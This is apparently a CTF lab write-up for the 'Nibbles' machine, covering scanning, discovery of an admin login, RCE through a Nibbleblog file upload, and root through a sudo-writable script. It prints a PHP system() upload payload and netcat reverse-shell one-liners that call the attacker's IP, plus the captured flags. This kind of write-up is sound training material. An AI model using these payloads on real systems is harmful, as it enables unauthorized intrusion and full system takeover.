
## **Overview**

- **Difficulty:** Easy
- **Operating System:** Linux
- **Objective:** Understand potential breaking points in nibble machine.
- **Tools Used:** `nmap`, `nc`, `whatweb`, `searchsploit`, `metasploit`, `gobuster`, `SecsList`, `linpeas`

---

## **Starting Enumeration with Nmap**

The very first step is to get an idea of the open ports and services running.
To do this we will start with `nmap` scans:
```
$ sudo nmap -sV --open -oA nmap-scans/nmaphere 10.129.163.128
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-03 20:34 IST
Nmap scan report for 10.129.163.128
Host is up (0.27s latency).
Not shown: 972 closed tcp ports (reset), 26 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.48 seconds

```

Here, two ports are open, SSH and HTTP which also show that the target is running Linux Ubuntu 2.2 version and an Apache httpd 2.4.18 server.

But, before we go deeper into these open ports, let's run an all ports TCP scan and leave it in the background cause usually it takes forever to happen.
```
$ sudo nmap -p- --open -oA nmap-scans/fullscans 10.129.163.128
```

I actually did some banner grabbing in the meanwhile, but for consistency sake, I also immediately did a few other nmap scans to try and get as much information as possible.

Also, since I know that ports 22 and 80 are open, I first ran this scan using default nmap scripts using `-sc` flag as:
```
$ sudo nmap -sC -p22,80 -oA nmap-scans/scriptscans 10.129.163.128
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-03 20:48 IST
Nmap scan report for 10.129.163.128
Host is up (0.25s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http
|_http-title: Site doesn't have a title (text/html).

Nmap done: 1 IP address (1 host up) scanned in 10.25 seconds
```

Second, I also tried to use a scan script that would probe nmap to find frequently named web page directories or files that contain important and sensitive information using the `--script=http-enum`:
```
$ nmap -sV --script=http-enum -oA nmap-scans/http-enumscan 10.129.163.128
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-03 20:50 IST
Nmap scan report for 10.129.163.128
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.67 seconds

```

As seen there was not much luck here. No useful information was retrieved.

---

## **Banner Grabbing**

Just before I was about to start banner grabbing, I also got back the results for the all port scans I did, and least to say they were quite disappointing but np :_ ).
```
$ sudo nmap -p- --open -oA nmap-scans/fullscans 10.129.163.128
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-03 20:36 IST
Nmap scan report for 10.129.163.128
Host is up (0.50s latency).
Not shown: 65281 closed tcp ports (reset), 252 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 75.81 seconds

```

No serious information found.
Let's start banner grabbing!
I first used the good old nc to get basic banner information:
```
 nc -nv 10.129.163.128 22
Connection to 10.129.163.128 22 port [tcp/*] succeeded!
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
```

```
$ nc -nv 10.129.163.128 80
Connection to 10.129.163.128 80 port [tcp/*] succeeded!

HTTP/1.1 400 Bad Request
Date: Fri, 03 Jan 2025 15:39:17 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 301
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 127.0.1.1 Port 80</address>
</body></html>

```

This validates that the target hosts an Apache Web Server and an OpenSSH server at ports 80 and 22 respectively.

---

## **Web Footprinting**

After having pretty hard luck in the scanning.
Let's figure out the various technologies used and see whether we can find vulnerabilities in them.

Let's start with `whatweb` to get a basic idea of the technologies used:
```
$ whatweb 10.129.163.128 > web-footprinting/whatweb-scan
$ cat web-footprinting/whatweb-scan 
http://10.129.163.128 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.163.128]
```

We already know all this. No useful information here again.
Let's have a look at the website:
![[Pasted image 20250103213752.png]]

Shows a simple website saying "Hello World!". Let's also take a look at the source code using `ctrl+u`:
```
<b>Hello world!</b>



<!-- /nibbleblog/ directory. Nothing interesting here! -->

```

Aha! There's a weird looking directory mentioned!
Let's check it out:
![[Pasted image 20250103213945.png]]

Does not look interesting at first.
But, let's check out technologies used using `whatweb`:
```
$ whatweb http://10.129.163.128/nibbleblog/
http://10.129.163.128/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.163.128], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]
```

This website is using HTML, PHP and JQuery.
Also, upon further google searches, `nibbleblog` turns out to be an actual thing.
It's a blog making platform using PHP and instead of using a traditional database it saves data as files.

Now, if we search up for `nibbleblog exploit` this [page](https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload/) is one of them that strikes and is a critical finding!
There's a **Nibbleblog File Upload Vulnerability** which allows an *authenticated* user to remotely execute arbitrary PHP codes. It was tested for version 4.0.3.

It also mentions a metasploit module to use:
```
msf > use exploit/multi/http/nibbleblog_file_upload msf exploit(nibbleblog_file_upload) > show targets ...targets... msf exploit(nibbleblog_file_upload) > set TARGET < target-id > msf exploit(nibbleblog_file_upload) > show options ...show and set options... msf exploit(nibbleblog_file_upload) > exploit
```
Noted!

We just yet don't know whether the version of nibbleblog being used is 4.0.3 or not. So, let's try to figure that out.
Seeing what options are required:
```
msf6 exploit(multi/http/nibbleblog_file_upload) > show options

Module options (exploit/multi/http/nibbleblog_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the web application
   USERNAME                    yes       The username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.10.37    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Nibbleblog 4.0.3

```

We clearly need:
- Username (Don't have)
- Password (Don't have)
- TargetURI (We have)
- RPORT (We have)
- RHOSTS (We have)

So, let go figure out the version and a set of username and password.

---
## **Enumerating Hidden Directories and Files**

Let's use `gobuster` along with `seclists` wordlists to find all hidden directories and paths.
```
$ gobuster dir --url http://10.129.163.128/nibbleblog// --wordlist ~/Documents/Tools/Wordlists/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.163.128/nibbleblog//
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/alice/Documents/Tools/Wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 305]
/.htaccess            (Status: 403) [Size: 310]
/.htpasswd            (Status: 403) [Size: 310]
/README               (Status: 200) [Size: 4628]
/admin                (Status: 301) [Size: 328] [--> http://10.129.163.128/nibbleblog//admin/]
/admin.php            (Status: 200) [Size: 1401]
/content              (Status: 301) [Size: 330] [--> http://10.129.163.128/nibbleblog//content/]
/index.php            (Status: 200) [Size: 2987]
/languages            (Status: 301) [Size: 332] [--> http://10.129.163.128/nibbleblog//languages/]
/plugins              (Status: 301) [Size: 330] [--> http://10.129.163.128/nibbleblog//plugins/]
/themes               (Status: 301) [Size: 329] [--> http://10.129.163.128/nibbleblog//themes/]
Progress: 4735 / 4736 (99.98%)
===============================================================
Finished
===============================================================

```

And, we do have quite a bunch of links! Let's go through each one at a time!
Starting with http://10.129.163.128/nibbleblog//admin/:
![[Pasted image 20250103225757.png]]

There's nothing too exciting here. I'll save you the time.
The next interesting space is http://10.129.163.128/nibbleblog/README and oh boy! Here, we figure the first part of the puzzle and find that `nibbleblog version 4.0.3` is in use!:
```
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01

Site: http://www.nibbleblog.com
Blog: http://blog.nibbleblog.com
Help & Support: http://forum.nibbleblog.com
Documentation: http://docs.nibbleblog.com

===== Social =====
* Twitter: http://twitter.com/nibbleblog
* Facebook: http://www.facebook.com/nibbleblog
* Google+: http://google.com/+nibbleblog

===== System Requirements =====
* PHP v5.2 or higher
* PHP module - DOM
* PHP module - SimpleXML
* PHP module - GD
* Directory â€œcontentâ€ writable by Apache/PHP

Optionals requirements

* PHP module - Mcrypt

...
```

Also, the next important page would've been http://10.129.163.128/nibbleblog/admin.php but I bruteforced a few too many times and got blacklisted but this was the login portal for admins.

I used combinations like `admin:admin`, `root:root` and `admin:password123` and tadaaa I was locked out :_ )

Nevertheless, moving on after a little scanning and digging I find within this directory http://10.129.163.128/nibbleblog//content/private/users.xml a `users.xml` which contained some real gold:
```
<users>
<user username="admin">
<id type="integer">0</id>
<session_fail_count type="integer">2</session_fail_count>
<session_date type="integer">1735919677</session_date>
</user>
<blacklist type="string" ip="10.10.10.1">
<date type="integer">1512964659</date>
<fail_count type="integer">1</fail_count>
</blacklist>
<blacklist type="string" ip="10.10.15.46">
<date type="integer">1735919657</date>
<fail_count type="integer">5</fail_count>
</blacklist>
</users>
```

As seen I had the username correct, there is a user with username `admin` just left to figure the password out. So, one last key left to find. 

So far, we know:
- A Nibbleblog install potentially vulnerable to an authenticated file upload vulnerability
- An admin portal at `nibbleblog/admin.php`
- Directory listing which confirmed that `admin` is a valid username
- Login brute-forcing protection blacklists our IP address after too many invalid login attempts. This takes login brute-forcing with a tool such as [Hydra](https://github.com/vanhauser-thc/thc-hydra) off the table

Also, after looking at some more pages like http://10.129.163.128/nibbleblog//content/private/config.xml, there's a brief chance that since so many times here and there they've written the word `nibbles` there's a slight chance this can be the password too.

It's safe to say that we may have a password and have cracked all the keys!
So far, we know:
- We started with a simple `nmap` scan showing two open ports
- Discovered an instance of `Nibbleblog`
- Analyzed the technologies in use using `whatweb`
- Found the admin login portal page at `admin.php`
- Discovered that directory listing is enabled and browsed several directories
- Confirmed that `admin` was the valid username
- Found out the hard way that IP blacklisting is enabled to prevent brute-force login attempts
- Uncovered clues that led us to a valid credentials `admin:nibbles`

In fact after logging in using `admin:nibbles`, we do get in.
On scrolling around, oh boy! What i'm about to type is one of the craziest things i've ever done!

So, looking around, I saw plugins and there is this images tab.
Let's try to inject and try RCE using php since we remember that nibblesblog is in php.
Let's create a `phpInject.php`:
```
$ echo "<?php system('id'); ?>" > phpInject.php
```

Now, upload this php into the browse option and hit `save`.
![[Pasted image 20250103235454.png]]

Clearly, it's executing it! This also means we can execute a reverse shell to us!
Let's just find where this is going.

If you go back to http://10.129.184.244//nibbleblog//content/private/plugins/my_image/ that we found using gobuster, remember?
![[Pasted image 20250103235647.png]]

This is it! You can either open this or use curl and it will execute.
On opening, it returns:
```
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

Clearly, RCE is working!!
Now, let's create a reverse shell:
First, listen using nc on a port of your choice, i chose 4444:
```
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
```

Next, create a php file with the reverse shell command:
```
$ echo "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.46 9443 >/tmp/f'); ?>" > reverse.php
```
(Also if you noticed an IP change in the middle somewhere it was cause I forgot to renew the timer)

How do I know my IP, use `ifconfig`:
```
$ ifconfig
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.15.46  netmask 255.255.254.0  destination 10.10.15.46
        inet6 dead:beef:2::112c  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::4919:66a6:9e9b:353a  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 79994  bytes 6825774 (6.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 83963  bytes 4886213 (4.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

When we upload this php to the images and do as we did all over to execute it, we now have a successful reverse shell!
```
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.184.244 40448
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
/bin/sh: 1: python: not found
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd /home
<ml/nibbleblog/content/private/plugins/my_image$ cd /home                    
nibbler@Nibbles:/home$ ls
ls
nibbler
nibbler@Nibbles:/home$ cd nibbler
cd nibbler
nibbler@Nibbles:/home/nibbler$ ls
ls
personal.zip  user.txt
nibbler@Nibbles:/home/nibbler$ cat user.txt
cat user.txt
79c03865431abf47b90ef24b9695e148
```

So as you see python was not installed but usually its python3 that's installed. So a rough guess came correct.

Also, I have not forgotten that we are also able to exploit the metasploit but this was another excellent finding.

Now, the last thing that remains is to escalate privs.
So, let's first check what privs we have using:
```
$ sudo -l
```

and we get to see that we have full sudo privs over `/home/nibbler/personal/stuff/monitor.sh` and this is gold.
We can run using sudo access to another reverse shell say at port 8444 and get complete root access.

So, in the personal.zip, first unzip it:
```
nibbler@Nibbles:/home/nibbler$ unzip personal.zip
unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
```

Let's move into the directory and edit the `monitor.sh` since this is the file who's sudo privs will give us root access:
```shell-session
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.46 8444 >/tmp/f' | tee -a monitor.sh
```

Now, I appended it to the last line since when this executable runs it will execute everything in it, but don't run it just yet. Let's first power on `nc` at port `8444` (8444 is just from the reference i was taking, but you can take any):
```
$ nc -lvnp 8444
Listening on 0.0.0.0 8444
```

Let's now execute the .sh but with `sudo`:
```
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh
sudo ./monitor.sh
'unknown': I need something more specific.
/home/nibbler/personal/stuff/monitor.sh: 26: /home/nibbler/personal/stuff/monitor.sh: [[: not found
/home/nibbler/personal/stuff/monitor.sh: 36: /home/nibbler/personal/stuff/monitor.sh: [[: not found
/home/nibbler/personal/stuff/monitor.sh: 43: /home/nibbler/personal/stuff/monitor.sh: [[: not found
```

Gives a bunch of bs, but looking at whether picked up or not:
```
Connection received on 10.129.165.72 35574
#
```

Bingo!!!! We've connected, also if you notice the `#` means we're logged on as root!
Let's go get the last flag:
```
# ls
monitor.sh
# ls /root
root.txt
# cat /root
cat: /root: Is a directory
# cat /root/root.txt
de5e5d6619862a8aa5b9b212314e0cdd
```

With this we've successfully hacked the box.

---
## **Flag**

The user.txt flag is `79c03865431abf47b90ef24b9695e148`.
The root.txt flag is `de5e5d6619862a8aa5b9b212314e0cdd`.

---

**Prepared by Araiz Naqvi**